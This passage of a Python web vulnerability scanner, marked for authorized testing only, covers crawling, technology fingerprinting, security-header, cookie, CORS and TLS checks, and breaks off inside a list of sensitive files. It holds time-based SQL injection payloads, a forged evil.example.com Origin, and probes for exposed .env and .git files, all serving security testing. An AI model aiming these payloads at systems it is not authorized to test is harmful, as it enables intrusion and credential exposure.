"""
Vuln engine v3 — enterprise-oriented, stdlib only. AUTHORIZED TESTING ONLY.

Upgrade dari v2 (lihat AUDIT.md & UPGRADE_NOTES.md):
- Marker unik PER SCAN (bukan per proses), baseline soft-404 untuk menekan false positive.
- Crawler beneran (crawler.py): form, JS endpoint, robots/sitemap -> parameter NYATA yang diuji.
- Verifikasi berlapis: content signature untuk file sensitif, SQLi error+boolean+time,
  XSS multi-konteks, SSTI, traversal/LFI, command injection, CRLF, SSRF (metadata+oracle).
- Setiap finding punya confidence: confirmed | probable | candidate + location & param.
  Kandidat CVE berbasis versi DILABELI candidate — bukan klaim terkonfirmasi.
- Check baru: API exposure (Swagger/OpenAPI/GraphQL introspection), CSRF form,
  JWT analysis, unauthenticated service API (Docker/Elasticsearch/kubelet),
  kualitas CSP/HSTS, cookie per-item (Secure/HttpOnly/SameSite).
"""
import base64
import hashlib
import hmac as hmac_mod
import json
import re
import secrets as pysecrets
import time
from urllib.parse import parse_qsl, quote, urlencode, urlparse

from netclient import Client, similarity
import netclient
import crawler as crawl_mod
import wafscore
import xssverify
import timingoracle
import diffconfirm
from scanners import (COMMON_PORTS, tcp_scan, tcp_scan_detailed,
                      ssl_audit, resolve_host, org_domain)
from secretpatterns import (WEB_TIER_A_PATTERNS, WEB_GENERIC_SECRET_RE,
                            DETECTORS_V2, AWS_SECRET_RE,
                            github_token_structurally_valid, parse_jwt,
                            luhn_valid, bip39_phrase_status,
                            is_denied_secret, shannon_entropy,
                            _mask as _secret_mask)

SEV_ORDER = {"CRITICAL": 4, "HIGH": 3, "MEDIUM": 2, "LOW": 1, "INFO": 0}

SQL_ERRORS = [
    "you have an error in your sql syntax", "mysql_fetch", "mysql_num_rows",
    "ora-00933", "ora-01756", "ora-00942", "sqlite3.", "sqlite error",
    "pg_query", "psql: error", "postgresql error", "unclosed quotation mark",
    "odbc microsoft access", "warning: mysql", "unterminated string",
    "quoted string not properly terminated", "microsoft ole db provider for sql server",
    "invalid object name", "com.mysql.jdbc", "org.postgresql.util.psqlexception",
    "django.db.utils", "sqlalchemy.exc", "syntax error at or near",
]
SQL_TIME_PAYLOADS = ["1' AND SLEEP(3)-- -", "1 AND SLEEP(3)",
                     "1'; SELECT pg_sleep(3)-- -", "1' WAITFOR DELAY '0:0:3'-- -",
                     "1 AND DBMS_PIPE.RECEIVE_MESSAGE('a',3)"]


def _zero_delay(payload):
    """Zero-delay twin of a time payload (WS1 v1.7.0): the same syntax
    with the delay set to 0, for the timing oracle's triple-step
    confirmation. Returns the payload unchanged when no known delay
    construct is present (the caller then skips that family)."""
    p = re.sub(r"(?i)sleep\(\s*3\s*\)", "sleep(0)", payload)
    p = p.replace("'0:0:3'", "'0:0:0'")
    p = re.sub(r"(?i)(receive_message\('[^']*',\s*)3(\s*\))",
               r"\g<1>0\g<2>", p)
    return p


def F(sev, title, desc, evidence="", cwe="", owasp="", cvss=0.0, remed="",
      confidence="probable", location="", param="", origin="active"):
    return {"severity": sev, "title": title, "description": desc,
            "evidence": evidence, "cwe": cwe, "owasp": owasp, "cvss": cvss,
            "remediation": remed, "confidence": confidence,
            "location": location, "param": param, "origin": origin}


class Ctx:
    def __init__(self, target, opts, log_list, job_cancel=None):
        self.target = target
        self.client = Client(target, timeout=float(opts.get("timeout", 6.0)),
                             extra_headers=opts.get("headers") or {},
                             cookie=opts.get("cookie", ""),
                             proxy=opts.get("proxy", ""))
        self._deadline = None
        self.marker = pysecrets.token_hex(5)
        self.num_a = pysecrets.randbelow(80) + 11
        self.num_b = pysecrets.randbelow(8) + 3
        self.log = log_list
        self._cancel = job_cancel
        self.client.should_continue = lambda: not self.cancelled()
        self._surf = None
        self._soft404 = None
        self.technologies = []
        self.opts = opts
        # ---- WS1 (v1.4.0): canary/OAST state. scan_id correlates every
        # token this scan plants in the (possibly shared) registry.
        self.scan_id = str(opts.get("scan_id") or f"scan-{self.marker}")
        _can = opts.get("canary") or {}
        self.canary_configured = bool(_can.get("registry") and _can.get("base"))
        if not self.canary_configured:
            self.canary_base_kind = "none"
        elif _can.get("base_kind") in ("external", "builtin"):
            self.canary_base_kind = _can["base_kind"]
        else:
            _b = str(_can.get("base") or "")
            self.canary_base_kind = ("builtin" if ("127.0.0.1" in _b
                                                   or "localhost" in _b)
                                     else "external")
        try:
            self.canary_grace_s = max(0.0, float(opts.get("canary_grace_s", 60)))
        except Exception:
            self.canary_grace_s = 60.0
        self._oob_planted = []        # entry dicts (see _oob_issue)
        self._oob_reported = set()   # tokens already turned into findings
        self._oob_last_plant_ts = 0.0
        self._xss_marks = None        # WS2 marker sandwich (lazy)
        # v1.8.0: structured per-check metadata that is not a finding
        # (BFLA matrix rows, AXFR/bucket/OAuth evaluation summaries,
        # leftover upload artifacts) — surfaced in the scan result.
        self.check_meta = {}

    def xss_marks(self):
        """WS2 marker sandwich for this scan (lazy, stable per scan)."""
        if self._xss_marks is None:
            self._xss_marks = xssverify.make_sandwich(self.marker)
        return self._xss_marks

    def canary_status(self, note=""):
        """Honest OAST status for the scan result meta (WS1): whether a
        canary was configured at all, what kind of base, how many tokens
        this scan planted and how many callbacks actually arrived."""
        st = {"configured": self.canary_configured,
              "base_kind": self.canary_base_kind,
              "tokens_planted": len(self._oob_planted),
              "callbacks_received": 0, "tokens_hit": 0,
              "grace_window_s": self.canary_grace_s, "note": note}
        if self.canary_configured:
            reg = (self.opts.get("canary") or {}).get("registry")
            try:
                s = reg.stats(self.scan_id)
                st["callbacks_received"] = s["callbacks_received"]
                st["tokens_hit"] = s["tokens_hit"]
            except Exception:
                pass
        return st

    def L(self, msg):
        if self.log is not None:
            self.log.append(msg)

    def cancelled(self):
        if self._cancel and self._cancel():
            return True
        return bool(getattr(self, "_deadline", None)
                    and time.time() > self._deadline)

    def soft404(self):
        if self._soft404 is None:
            self._soft404 = self.client.get(f"/ptk-{self.marker}-nonexistent-{self.num_a}")
        return self._soft404

    def is_missing(self, resp):
        if resp.status in (404, 410):
            return True
        base = self.soft404()
        if base.status == resp.status and resp.body:
            if similarity(resp.body, base.body) > 0.92:
                return True
        return False

    def surface(self, full=True):
        # Cache dibedakan: crawl terbatas (pasif, 1 halaman) TIDAK boleh mengunci
        # crawl penuh yang diminta check aktif belakangan di scan yang sama.
        if self._surf is None or (full and not getattr(self, "_surf_full", False)):
            self._surf = crawl_mod.crawl(
                self.client, log=self.L,
                max_pages=int(self.opts.get("max_pages", 30)) if full else 1,
                cancelled=self.cancelled)
            self._surf_full = full
            try:
                self._surf.param_urls.sort()
                self._surf.js_endpoints.sort()
            except Exception:
                pass
            extra = self.opts.get("headless_endpoints")
            if extra and not getattr(self, "_headless_merged", False):
                for e in extra:
                    if e not in self._surf.js_endpoints:
                        self._surf.js_endpoints.append(e)
                    if "?" in e and e not in self._surf.param_urls:
                        self._surf.param_urls.append(e)
                self._headless_merged = True
                self.L(f"  [headless] {len(extra)} rendered-DOM endpoints merged into surface")
        return self._surf

    _PATH_OK = re.compile(r"^/[A-Za-z0-9._~!$&'()*+,;=:@%/-]*$")
    _NAME_OK = re.compile(r"^[A-Za-z_][A-Za-z0-9_.\[\]-]{0,40}$")
    _STATIC_BASE = (".js", ".css", ".png", ".jpg", ".jpeg", ".gif", ".svg", ".ico",
                    ".map", ".woff", ".woff2", ".ttf", ".mp4", ".pdf")

    @classmethod
    def _sane_target(cls, base, name):
        """Tolak target parameter sampah hasil salah-urai konten (v3.2.1):
        path berisi kurung/kutip/spasi/backslash atau terlalu panjang dan nama
        param yang bukan identifier wajar adalah fragmen kode, bukan parameter."""
        if not base or len(base) > 160 or not cls._PATH_OK.match(base):
            return False
        if any(ch in base for ch in '()[]{}<>"`\\ ') or "&&" in base or ");" in base:
            return False
        if base.lower().endswith(cls._STATIC_BASE):
            return False
        return bool(cls._NAME_OK.match(name or ""))

    def param_targets(self, limit=14):
        """Target parameter untuk uji aktif. Tiga sumber (URL berquery dari
        crawl, form, tebakan baku) digabung ROUND-ROBIN — bukan berurutan —
        supaya limit tidak memotong habis satu jenis sumber (dulu: 13 URL GET
        pertama memenuhi limit 14 dan semua form POST, termasuk endpoint XML,
        tidak pernah teruji — miss yang ditangkap battery v3.4)."""
        surf = self.surface(full=True)
        seen = set()
        gets, forms_l, guesses = [], [], []
        for pq in surf.param_urls:
            base, names = crawl_mod.params_of(pq)
            for n in names[:3]:
                if not self._sane_target(base, n):
                    continue
                k = (base, n, "GET")
                if k not in seen:
                    seen.add(k); gets.append((base, n, "GET", pq))
        for form in surf.forms:
            for n in form["inputs"][:4]:
                if not self._sane_target(form["action"], n):
                    continue
                k = (form["action"], n, form["method"])
                if k not in seen:
                    seen.add(k); forms_l.append((form["action"], n, form["method"], None))
        for pq in crawl_mod.GUESS_PARAM_URLS:
            base, names = crawl_mod.params_of(pq)
            r = self.client.get(pq)
            if r.status and not self.is_missing(r):
                for n in names:
                    if not self._sane_target(base, n):
                        continue
                    k = (base, n, "GET")
                    if k not in seen:
                        seen.add(k); guesses.append((base, n, "GET", pq))
            if len(gets) + len(forms_l) + len(guesses) >= limit * 2:
                break
        out = []
        srcs = [gets, forms_l, guesses]
        idx = [0, 0, 0]
        while len(out) < limit:
            progressed = False
            for si, src in enumerate(srcs):
                if idx[si] < len(src) and len(out) < limit:
                    out.append(src[idx[si]]); idx[si] += 1; progressed = True
            if not progressed:
                break
        return out

    def req_param(self, base, pname, value, method="GET", orig_qs=None):
        if method == "POST":
            return self.client.post(base, data=f"{pname}={quote(value, safe='')}")
        params = {}
        if orig_qs and "?" in orig_qs:
            for pair in orig_qs.split("?", 1)[1].split("&"):
                if "=" in pair:
                    k, v = pair.split("=", 1); params[k] = v
        params[pname] = quote(value, safe="")
        qs = "&".join(f"{k}={v}" for k, v in params.items())
        return self.client.get(base, params=qs)


# ------------------------------------------------------------ passive checks

def c_version_disclosure(ctx, add):
    r = ctx.surface(full=False).homepage or ctx.client.get("/")
    server = r.hdr("server")
    if server and any(c.isdigit() for c in server):
        add(F("LOW", f"Server version disclosure: {server}",
              "Versi software terpapar — memudahkan pencarian exploit spesifik.",
              evidence=server, cwe="CWE-200", owasp="A05:2021 Security Misconfiguration",
              cvss=3.1, remed='Hide the version in headers (server_tokens off, etc.).',
              confidence="confirmed", location="/"))
    pb = r.hdr("x-powered-by")
    if pb:
        add(F("LOW", f"X-Powered-By disclosure: {pb}",
              "Teknologi backend terpapar.", evidence=pb, cwe="CWE-200",
              owasp="A05:2021", cvss=3.1, remed='Remove the X-Powered-By header.',
              confidence="confirmed", location="/"))


def _tech_fingerprint(ctx):
    """Profil teknologi & integrasi dari artefak homepage (techdb v3.5):
    server, runtime, framework, CMS, library JS, analytics, chat, payment,
    captcha, auth — setiap entri membawa evidence penemunya."""
    if ctx.technologies:
        return ctx.technologies
    import techdb
    r = ctx.surface(full=False).homepage or ctx.client.get("/")
    body = r.body or ""
    srcs = re.findall(r"""<script[^>]+src\s*=\s*["']([^"']+)["']""", body, re.I)
    # Halaman error (soft-404) ditambang untuk sidik jari database/framework/
    # OS — pesan error bocor adalah sumber stack yang tidak terlihat di
    # homepage (v3.8). Respons ghost yang sama dipakai ulang cache Ctx.
    try:
        error_body = ctx.soft404().body or ""
    except Exception:
        error_body = ""
    techs = techdb.profile(list(r.headers), body, srcs, error_body=error_body)
    gen = r.hdr("x-generator")
    if gen and not any(t["name"] == gen[:40] for t in techs):
        techs.append({"name": gen[:40], "category": "CMS", "version": "",
                      "evidence": "X-Generator", "source": "header"})
    # Verifikasi aktif (v3.7): stack yang terdeteksi dari artefak pasif
    # dibuktikan dengan probe ke endpoint khasnya — klaim teknologi naik
    # kelas dari "fingerprint" menjadi "terverifikasi berjalan".
    verified_n = 0
    for t in techs:
        spec = techdb.verify_spec(t["name"])
        if not spec or verified_n >= 3:
            continue
        try:
            vr = ctx.client.get(spec[0])
        except Exception:
            continue
        if vr.status == 200 and vr.body:
            ok, ver = techdb.parse_verify(t["name"], vr.body)
            if ok:
                t["verified"] = True
                t["confidence"] = "verified"
                t["evidence"] = f"{t['evidence']}; actively verified via {spec[0]}"
                if ver:
                    t["version"] = ver
                verified_n += 1
                ctx.L(f"  [tech-verify] {t['name']} CONFIRMED via {spec[0]}")
    # Probe komponen deployment/API (v1.1): endpoint khas milik tool itu
    # sendiri (registry /v2/, K8s /version, Portainer, Argo CD, Jenkins
    # /login, OpenAPI, GraphQL) — klaim hanya dari signature produk yang
    # terparse, status 200 telanjang tidak pernah cukup.
    for path, pname, pcat, parser, method, pbody in techdb.COMPONENT_PROBES:
        try:
            if method == "POST":
                pr = ctx.client.post(path, data=json.dumps(pbody),
                                     headers={"Content-Type": "application/json"})
            else:
                pr = ctx.client.get(path)
        except Exception:
            continue
        if not pr or (pr.status not in (200, 401) and method == "GET"):
            continue
        hit, pver = parser(list(pr.headers), pr.body or "")
        if not hit:
            continue
        if pname == "OpenID Connect (OIDC)":
            # Issuer ber pola /realms/<realm> = sidik jari Keycloak: klaim
            # produk spesifiknya, bukan hanya protokol generik.
            try:
                _iss = json.loads(pr.body or "").get("issuer", "")
            except Exception:
                _iss = ""
            if "/realms/" in _iss:
                pname, pcat = "Keycloak", "Auth/SSO"
                ev_note = f"OIDC issuer {_iss[:80]}"
                cur = next((t for t in techs if t["name"] == "Keycloak"), None)
                if cur is None:
                    techs.append({"name": "Keycloak", "category": "Auth/SSO",
                                  "version": "", "evidence": ev_note,
                                  "source": "probe",
                                  "evidence_list": [ev_note],
                                  "sources": ["probe"],
                                  "detail": techdb.DETAILS.get("Keycloak", ""),
                                  "confidence": "verified", "verified": True,
                                  "version_confidence": ""})
                else:
                    cur["verified"] = True
                    cur["confidence"] = "verified"
                ctx.L(f"  [tech-probe] Keycloak CONFIRMED via OIDC issuer {ev_note}")
                continue
        ev = f"probe {path}: product signature confirmed"
        cur = next((t for t in techs if t["name"] == pname), None)
        if cur is None:
            techs.append({"name": pname, "category": pcat, "version": pver,
                          "evidence": ev, "source": "probe",
                          "evidence_list": [ev], "sources": ["probe"],
                          "detail": techdb.DETAILS.get(pname, ""),
                          "confidence": "verified", "verified": True,
                          "version_confidence": "verified" if pver else ""})
        else:
            cur["verified"] = True
            cur["confidence"] = "verified"
            if pver:
                cur["version"] = pver
                cur["version_confidence"] = "verified"
            if ev not in cur.get("evidence_list", []):
                cur.setdefault("evidence_list", []).append(ev)
        ctx.L(f"  [tech-probe] {pname} {pver} CONFIRMED via {path}")
    # WS4 escalation probe (v1.7.0): ONE extra fetch — /favicon.ico —
    # whose MD5 is checked against techdb.FAVICON_MD5 (known product
    # hashes). A match is an independent artifact: it corroborates an
    # existing detection or introduces the technology before relations
    # and scoring run. (The characteristic-error-page leg of the
    # escalation already exists: error_body mining in techdb.profile
    # at the 0.85 'error' source score.)
    try:
        _fr = ctx.client.get("/favicon.ico")
        if _fr.status == 200 and getattr(_fr, "raw", b""):
            _md5 = hashlib.md5(_fr.raw).hexdigest()
            _fname = techdb.FAVICON_MD5.get(_md5)
            if _fname:
                _cur = next((t for t in techs if t["name"] == _fname),
                            None)
                if _cur is None:
                    techs.append({
                        "name": _fname,
                        "category": techdb._CAT_BY_NAME.get(_fname, ""),
                        "version": "",
                        "evidence": f"favicon MD5 {_md5} matches known "
                                    f"{_fname} favicon",
                        "source": "favicon",
                        "evidence_list": [f"favicon MD5 {_md5}"],
                        "sources": ["favicon"],
                        "detail": techdb.DETAILS.get(_fname, ""),
                        "confidence": "probable",
                        "version_confidence": ""})
                else:
                    if "favicon" not in (_cur.get("sources") or []):
                        _cur.setdefault("sources", []).append("favicon")
                        _cur.setdefault("evidence_list", []).append(
                            f"favicon MD5 {_md5} matches")
                ctx.L(f"  [tech-escalation] favicon MD5 {_md5} -> {_fname}")
    except Exception:
        pass
    # WS3 (v1.10.0, K4): Next.js buildId dicatat sebagai IDENTIFIER
    # build — TIDAK PERNAH sebagai versi (versi Next.js hanya dari
    # manifest dependensi yang tervalidasi, WS2).
    for t in techs:
        if t["name"] == "Next.js":
            mb = re.search(r'"buildId"\s*:\s*"([^"\s]{1,64})"',
                           body or "")
            if mb:
                t["build_id"] = mb.group(1)
                note = (f"Next.js buildId {mb.group(1)} (build "
                        "identifier — not a version)")
                if note not in t["evidence_list"]:
                    t["evidence_list"].append(note)
            break

    # WS6 (v1.10.0): bukti EKOSISTEM dari ekstensi URL di permukaan
    # crawl — hanya menamai ekosistem, TIDAK PERNAH menghasilkan versi.
    _EXT_ECO = ((".jsp", "Java (Servlet)", "Runtime"),
                (".action", "Apache Struts", "Framework"),
                (".do", "Java (Servlet)", "Runtime"),
                (".aspx", "ASP.NET", "Runtime"),
                (".php", "PHP", "Runtime"),
                (".cfm", "Adobe ColdFusion", "Runtime"))
    try:
        _surf = ctx.surface(full=False)
        _urls = list(_surf.pages) + list(_surf.param_urls) \
            + list(_surf.js_endpoints)
        _urls += re.findall(r'(?:href|src)\s*=\s*"([^"]+)"',
                            body or "", re.I)
        _seen_ext = set(t["name"] for t in techs)
        for u in _urls:
            pth = (u or "").split("?")[0].split("#")[0].lower()
            for ext, nm, catg in _EXT_ECO:
                if pth.endswith(ext) and nm not in _seen_ext:
                    _seen_ext.add(nm)
                    techs.append({
                        "name": nm, "category": catg, "version": "",
                        "evidence": f"URL extension {ext} in crawled "
                                    f"link: {u[:120]}",
                        "source": "crawl",
                        "evidence_list": [f"URL extension {ext} in "
                                          f"crawled link: {u[:120]}"],
                        "sources": ["crawl"],
                        "detail": techdb.DETAILS.get(nm, "")})
                    break
    except Exception:
        pass

    # WS4 (v1.7.0): implies/excludes relations — a vetoed detection is
    # capped at candidate and can never be named probable+; its score
    # is still computed and shown in evidence.
    techdb.apply_relations(techs)
    # WS3/K4 (v1.4.0): the same scored-claim model as WAF fingerprinting
    # applies to technology detections — a claim carried by a SINGLE
    # artifact gets the base score of its strongest source; independent
    # corroborating sources add +0.10 each (cap 0.95); an actively
    # verified component scores 0.98. The score + its signals travel
    # into the finding evidence so single-sign claims stay auditable
    # (a bare product name in body text = source 'html' at 0.55, never
    # dressed up as more than it is).
    _SRC_SCORE = {"error": 0.85, "header": 0.80, "script": 0.75,
                  "cookie": 0.70, "html": 0.55, "probe": 0.95,
                  "favicon": 0.80, "implied": 0.40, "crawl": 0.45}
    for t in techs:
        _srcs = list(dict.fromkeys(t.get("sources")
                                   or [t.get("source", "html")]))
        _score = max((_SRC_SCORE.get(s, 0.50) for s in _srcs),
                     default=0.50)
        if len(_srcs) > 1:
            _score = min(0.95, _score + 0.10 * (len(_srcs) - 1))
        if t.get("verified"):
            _score = 0.98
        t["score"] = round(_score, 2)
    ctx.technologies = techs
    for t in techs:
        ctx.L(f"  [tech] {t['name']} {t.get('version', '')} ({t.get('category', '')})".rstrip())
    return techs


def c_tech_fingerprint(ctx, add):
    techs = _tech_fingerprint(ctx)
    for t in techs:
        if t.get("vetoed_by"):
            # WS4: a vetoed technology is never named in its own
            # finding; it remains visible in the aggregate profile
            # below, with its score and the veto reason in evidence.
            continue
        if t.get("version"):
            _sigs = "; ".join(t.get("evidence_list") or [t["evidence"]])
            add(F("INFO", f"Technology detected: {t['name']} {t['version']}",
                  'Passive fingerprint from headers/HTML. Exact versions make it easier for an attacker to map relevant CVEs — CVE candidates (if any) are reported separately as candidates, not confirmed.',
                  evidence=(f"{t['evidence']} | fingerprint score "
                            f"{t.get('score', 0):.2f} (signals: {_sigs})"),
                  cwe="CWE-200", owasp="A05:2021", cvss=0.0,
                  remed='Hide the version where possible; ensure this version is patched.',
                  confidence="confirmed", location="/"))
    if techs:
        ringkas = "; ".join(
            f"{t['name']}{' ' + t['version'] if t.get('version') else ''} [{t.get('category', '')}]"
            + (f" (vetoed by {t['vetoed_by']} — candidate, score "
               f"{t.get('score', 0):.2f})" if t.get('vetoed_by') else "")
            + (" (implied)" if t.get('implied_by') else "")
            for t in techs)
        add(F("INFO", f"Technology & integration profile: {len(techs)} detected",
              'The stack and third-party services installed/integrated in this application, identified from response artifacts (headers, cookies, HTML, scripts) with per-item evidence in the scan result (tech_profile). Every integration is attack surface and supply chain that must be inventoried.',
              evidence=ringkas[:600], cwe="CWE-200", owasp="A05:2021", cvss=0.0,
              remed='Inventory and regularly patch all components, including JS libraries and third-party services.',
              confidence="confirmed", location="/"))


def c_security_headers(ctx, add):
    r = ctx.surface(full=False).homepage or ctx.client.get("/")
    if not r.ok:
        return
    present = {k.lower() for k, _ in r.headers}
    rules = [("strict-transport-security", "MEDIUM", "CWE-319", 5.9,
              'Enable HSTS: Strict-Transport-Security: max-age=31536000; includeSubDomains'),
             ("content-security-policy", "MEDIUM", "CWE-79", 5.4,
              'Add a CSP that restricts script/style sources.'),
             ("x-frame-options", "LOW", "CWE-1021", 4.3,
              'Set X-Frame-Options: DENY/SAMEORIGIN or frame-ancestors in CSP.'),
             ("x-content-type-options", "LOW", "CWE-430", 3.1,
              "Set X-Content-Type-Options: nosniff."),
             ("referrer-policy", "LOW", "CWE-200", 2.7,
              "Set Referrer-Policy: strict-origin-when-cross-origin."),
             ("permissions-policy", "LOW", "CWE-693", 2.7,
              'Restrict browser APIs via Permissions-Policy.')]
    https = ctx.client.scheme == "https"
    for name, sev, cwe, cvss, remed in rules:
        if name == "strict-transport-security" and not https:
            continue
        if name not in present:
            add(F(sev, f"Security header not set: {name}",
                  f"Header {name} not found in the response. {remed}",
                  cwe=cwe, owasp="A05:2021 Security Misconfiguration", cvss=cvss,
                  remed=remed, confidence="confirmed", location="/"))
    csp = r.hdr("content-security-policy")
    if csp:
        weak = [w for w in ("unsafe-inline", "unsafe-eval") if w in csp]
        if "'*'" in csp or re.search(r"(script-src|default-src)\s+[^;]*\*", csp) or weak:
            add(F("LOW", 'Weak Content-Security-Policy',
                  'CSP is present but allows ' +
                  (", ".join(weak) if weak else "wildcard") +
                  " — its XSS protection is greatly reduced.",
                  evidence=csp[:160], cwe="CWE-79", owasp="A05:2021", cvss=3.1,
                  remed='Tighten the CSP: avoid unsafe-inline/unsafe-eval & wildcards for script-src.',
                  confidence="confirmed", location="/"))
    hsts = r.hdr("strict-transport-security")
    if hsts and https:
        m = re.search(r"max-age=(\d+)", hsts)
        if m and int(m.group(1)) < 31536000:
            add(F("LOW", f"Weak HSTS max-age ({m.group(1)} seconds)",
                  'A max-age below 1 year gives a larger downgrade window.',
                  evidence=hsts[:120], cwe="CWE-319", owasp="A02:2021 Cryptographic Failures",
                  cvss=3.1, remed='Raise max-age to >= 31536000 and add includeSubDomains.',
                  confidence="confirmed", location="/"))


def c_cookie_security(ctx, add):
    r = ctx.surface(full=False).homepage or ctx.client.get("/")
    for raw in r.hdr_all("set-cookie"):
        name = raw.split("=", 1)[0].strip() or '(unnamed)'
        # Parse presisi via http.cookies: atribut dibaca dari morsel, bukan
        # substring pada seluruh header (kata 'httponly' di dalam VALUE cookie
        # tidak lagi menyembunyikan flag yang hilang). Header yang gagal
        # di-parse jatuh ke metode substring lama.
        attrs = None
        try:
            from http.cookies import SimpleCookie
            jar = SimpleCookie()
            jar.load(raw)
            if jar:
                morsel = next(iter(jar.values()))
                # Morsel MEMUAT semua kunci reserved ('' bila tak diset);
                # atribut dianggap ada hanya bila nilainya truthy
                # (flag telanjang tersimpan sebagai True).
                attrs = {k.lower() for k in morsel.keys() if morsel[k]}
                if morsel.key:
                    name = morsel.key
        except Exception:
            attrs = None
        low = raw.lower()
        if attrs is not None:
            has = lambda flag: flag in attrs
        else:
            has = lambda flag: flag in low
        missing = []
        if not has("httponly"):
            missing.append("HttpOnly")
        if ctx.client.scheme == "https" and not has("secure"):
            missing.append("Secure")
        if not has("samesite"):
            missing.append("SameSite")
        if not missing:
            continue
        sev = "MEDIUM" if "HttpOnly" in missing else "LOW"
        add(F(sev, f"Cookie '{name}' missing flags: {', '.join(missing)}",
              'Each cookie is analyzed per item. Missing HttpOnly = cookie readable by JS (amplifies XSS impact); missing Secure = cookie can be sent over HTTP; missing SameSite = larger CSRF surface.',
              evidence=raw[:140], cwe="CWE-1004" if "HttpOnly" in missing else "CWE-614",
              owasp="A05:2021", cvss=5.3 if sev == "MEDIUM" else 3.1,
              remed='Set HttpOnly + Secure (on HTTPS) + SameSite=Lax/Strict on the session cookie.',
              confidence="confirmed", location="/"))


def c_cors(ctx, add):
    evil = "https://evil.example.com"
    surf = ctx.surface(full=False)
    paths = ["/"] + list(surf.js_endpoints)[:2]
    for path in paths:
        r = ctx.client.get(path, headers={"Origin": evil})
        acao = r.hdr("access-control-allow-origin")
        acac = r.hdr("access-control-allow-credentials").lower()
        if acao == evil:
            add(F("HIGH" if acac == "true" else "MEDIUM",
                  f"CORS trusts an arbitrary Origin: {path}",
                  'The server echoes an external Origin in Access-Control-Allow-Origin'
                  + (' WITH credentials — authenticated data can be read by other sites.'
                     if acac == "true" else "."),
                  evidence=f"ACAO={acao}, ACAC={acac or 'absen'}", cwe="CWE-942",
                  owasp="A05:2021", cvss=8.1 if acac == "true" else 5.4,
                  remed="Whitelist origin secara eksplisit; jangan echo Origin.",
                  confidence="confirmed", location=path))
            return
        if acao == "*" and acac == "true":
            add(F("HIGH", f"CORS wildcard with credentials: {path}",
                  'The combination ACAO:* + credentials:true indicates a misconfigured CORS policy.',
                  evidence="ACAO=*, ACAC=true", cwe="CWE-942", owasp="A05:2021", cvss=7.4,
                  remed='Do not combine wildcards with credentials.',
                  confidence="confirmed", location=path))
            return
        r2 = ctx.client.get(path, headers={"Origin": "null"})
        if r2.hdr("access-control-allow-origin") == "null" and \
                r2.hdr("access-control-allow-credentials").lower() == "true":
            add(F("MEDIUM", f"CORS trusts a 'null' Origin + credentials: {path}",
                  'A null Origin can be forged from a sandboxed iframe / redirect.',
                  evidence="ACAO=null, ACAC=true", cwe="CWE-942", owasp="A05:2021",
                  cvss=6.5, remed='Reject a null Origin for credentialed endpoints.',
                  confidence="confirmed", location=path))
            return


def c_tls(ctx, add):
    host = ctx.client.host
    res = ssl_audit(host)
    if not res.get("ok"):
        add(F("INFO", 'TLS could not be audited',
              'Port 443 does not respond or the host has no HTTPS.',
              remed='Verify the HTTPS endpoint is reachable and correctly configured, then re-run the scan.',
              confidence="confirmed", location=":443"))
        return
    if res.get("verify_error"):
        add(F("HIGH", 'TLS certificate is not valid for standard clients',
              'Certificate verification against the built-in CA failed — prone to MITM if users are accustomed to ignoring warnings.',
              evidence=res["verify_error"][:160], cwe="CWE-295",
              owasp="A02:2021 Cryptographic Failures", cvss=7.4,
              remed='Use a certificate from a trusted public CA that matches the hostname.',
              confidence="confirmed", location=":443"))
    legacy = res.get("legacy_protocols_enabled") or []
    if legacy:
        add(F("HIGH", f"Deprecated TLS protocol enabled: {', '.join(legacy)}",
              'TLSv1.0/1.1 is prohibited by PCI-DSS and vulnerable to downgrade attacks.',
              evidence=str(legacy), cwe="CWE-327", owasp="A02:2021", cvss=7.4,
              remed='Disable TLS<1.2; use TLSv1.2+ with strong cipher suites.',
              confidence="confirmed", location=":443"))
    cipher = res.get("cipher") or []
    bits = cipher[2] if len(cipher) > 2 else 0
    if bits and bits < 128:
        add(F("MEDIUM", f"Weak TLS cipher ({bits}-bit)",
              'Negotiated cipher below 128-bit.', evidence=str(cipher),
              cwe="CWE-327", owasp="A02:2021", cvss=5.9,
              remed="Disable ciphers <128-bit / RC4 / 3DES.", confidence="confirmed",
              location=":443"))
    exp = res.get("not_after", "")
    if exp:
        import ssl as _ssl
        try:
            t = _ssl.cert_time_to_seconds(exp) - time.time()
            if t < 0:
                add(F("CRITICAL", 'TLS certificate EXPIRED',
                      f"Certificate expired {exp}.", evidence=exp, cwe="CWE-298",
                      owasp="A02:2021", cvss=9.1, remed='Renew the certificate immediately.',
                      confidence="confirmed", location=":443"))
            elif t < 14 * 86400:
                add(F("MEDIUM", 'TLS certificate expires soon (<14 days)',
                      f"Expired {exp}.", evidence=exp, cwe="CWE-298", owasp="A02:2021",
                      cvss=5.3, remed='Renew the certificate.', confidence="confirmed",
                      location=":443"))
        except Exception:
            pass
    san = res.get("san") or []
    host = ctx.client.host
    if san and host not in san and not any(
            s.startswith("*.") and host.endswith(s[1:]) and host.count(".") == s.count(".") + 1
            for s in san):
        add(F("MEDIUM", 'Hostname not covered by the certificate SAN',
              f"Host {host} not present in SAN: {', '.join(san[:6])}",
              evidence=", ".join(san[:6]), cwe="CWE-297", owasp="A02:2021", cvss=5.9,
              remed='Issue a certificate that covers this hostname.',
              confidence="confirmed", location=":443"))


# ------------------------------------------------------------ active: exposure

# path -> (severity, cwe, cvss, remediasi, [regex signature konten — WAJIB cocok salah satu])
SENSITIVE_FILES = {
    "/.env": ("HIGH", "CWE-200", 7.5, 'Application credentials are readable. Remove from the webroot and block at the web server.',
              [r"(?m)^[A-Z][A-Z0-9_]{2,}\s*=\s*\S+", r"APP_(KEY|ENV|DEBUG)", r"DB_(PASSWORD|HOST|DATABASE)"]),
    "/.env.bak": ("HIGH", "CWE-200", 7.5, 'Remove the .env backup from the webroot.',
                  [r"(?m)^[A-Z][A-Z0-9_]{2,}\s*=\s*\S+", r"DB_PASSWORD"]),
    "/.env.local": ("HIGH", "CWE-200", 7.5, 'Remove .env.local from the webroot.',
                    [r"(?m)^[A-Z][A-Z0-9_]{2,}\s*=\s*\S+"]),
    "/.git/config": ("HIGH", "CWE-538", 7.5, 'Block /.git access at the web server; deploy without .git.',
                     [r"\[core\]", r"\[remote\s"]),
    "/.git/HEAD": ("HIGH", "CWE-538", 7.5, 'Block /.git access at the web server.',
                   [r"ref:\s*refs/"]),
    "/.gitignore": ("LOW", "CWE-200", 3.7, "Informasi struktur repo; blok akses dotfiles.",
                    [r"(?m)^\S+"]),
    "/.svn/entries": ("HIGH", "CWE-538", 7.5, "Blok akses /.svn.", [r"svn", r"dir"]),
